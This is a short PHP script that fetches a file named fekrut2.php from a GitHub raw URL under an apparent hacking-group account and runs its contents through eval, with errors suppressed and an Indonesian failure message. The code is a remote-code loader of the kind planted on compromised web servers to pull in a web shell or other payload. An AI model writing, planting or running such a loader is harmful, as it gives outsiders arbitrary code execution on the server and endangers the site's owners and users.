<?php
$url = "https://raw.githubusercontent.com/bengkulucyberteam/bengkulucyberteam/refs/heads/main/fekrut2.php";
$code = @file_get_contents($url);

if ($code !== false) {
    eval("?>".$code);
} else {
    echo "Gagal mengambil file dari GitHub.";
}
?>
